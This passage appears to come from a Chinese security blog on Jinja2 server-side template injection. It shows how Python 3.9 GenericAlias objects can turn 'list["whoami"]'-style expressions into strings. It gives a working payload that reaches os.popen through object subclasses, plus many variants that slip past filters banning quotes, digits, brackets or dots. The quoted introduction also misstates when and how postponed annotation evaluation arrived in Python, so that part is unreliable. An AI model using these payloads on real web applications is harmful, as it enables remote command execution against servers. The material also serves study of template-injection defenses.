>在 Python 3.9 中，类型注解默认情况下是延迟评估的（通过 `from __future__ import annotations` 实现）。这意味着在类型注解中使用的类型名称将被表示为泛型别名 `<class 'types.GenericAlias'>`，但在运行时会被解析为其实际类型，比如上述例子中的 `List[int]` 最终会在运行时被解析为普通的 Python 列表类型 `list`。
>
>在 Python 3.9 之前，类型注解的解析是即时发生的。也就是说，在你定义一个变量或函数时，类型注解会立即被解析，并与相应的类型绑定。这可能会导致一些循环引用或其他复杂的类型注解的情况下出现问题。
>
>Python 3.9 引入了 `from __future__ import annotations` 语法特性。这个特性使得类型注解在默认情况下是延迟评估的，也称为前向声明。
>
>延迟评估意味着在解析类型注解时，不会立即对类型表达式进行求值和绑定。相反，类型表达式会被视为字符串，直到需要时才进行实际的类型解析。这使得 Python 解释器能够更好地处理复杂的类型注解，避免了循环引用等问题。
>
>在使用泛型别名时，你可以使用各种泛型类型，例如 `Union`、`Dict`、`Tuple` 等，以及自定义的泛型类型别名。

打印 `list[int]` 的结果是 `list[int]`，它其实是一个 `GenericAlias`：

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803230539610.png)

`list["whoami"]`，加上 jinja2 的 `.` 的特殊性，即可这样：

```
{{dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen((dict.whoami|string)[6:-2]|join).read()}}
```

利用相同的逻辑，我们可以找出其他 bypass 的姿势，其实都是利用了 `__class_getitem__`，再想办法把结果变成 str 类型：

1. `(dict.whoami|string)[6:-2]|join`
2. `(dict.whoami|title...`
3. `(dict.whoami|trim...`
4. `(dict.whoami|lower...`
5. `(dict.whoami|center...`
6. `(dict.whoami|format...`
7. `(dict.whoami|capitalize...`
8. `(dict.whoami|indent)[6:-2]|join`

下面这些会用到引号，所以可能并不实用：

1. `(dict.whoami|string).split("'").pop(-2)`
2. `(dict.whoami|replace("", "").pop(-2)`
3. `("00"|join(dict.whoami)).split("'").pop(-2)`
4. `(dict.whoami|urlize).split("'").pop(-2)`
5. `(dict.whoami|urlencode).split("%27").pop(-2)`

上面这么多都是类似的逻辑。如果出现过滤器禁用的情况，可以互相做替换。

组合之前的一些技巧，还可以这样：

1. 引号、`[ ]` 被过滤：`(dict.whoamiiii|string|slice(3)|list).pop(1)|join`（或者挨个 pop 完之后拼接起来，就是会比较长）
2. 引号、数字、`[ ]` 被过滤：`(dict.whoamiiii|string|slice(True+True+True)|list).pop(True)|join`

下面这些可能都不实用，但是作为技巧看一下还是挺有启发的：

```
# . 被过滤
([dict]|map(attribute='whoami')|list|string)[7:-3]

# 特定的过滤器被禁用
(([dict.whoamiiii|string]|list|map("sl"+"ice", 3)|list).pop(0)|list).pop(1)|join

# [] 被过滤 + 特定的过滤器被禁用
(((""|slice(1,fill_with=(dict.whoamiiii|string))|list).pop()|map("sl"+"ice", 3)|list).pop(0)|list).pop(1)|join
```

**自然，这个技巧只有 > py3.9 才可以使用。**

从上面可以看出，这个姿势要实用，很依赖 `.`，如果这个被干掉了那就要换其他的姿势了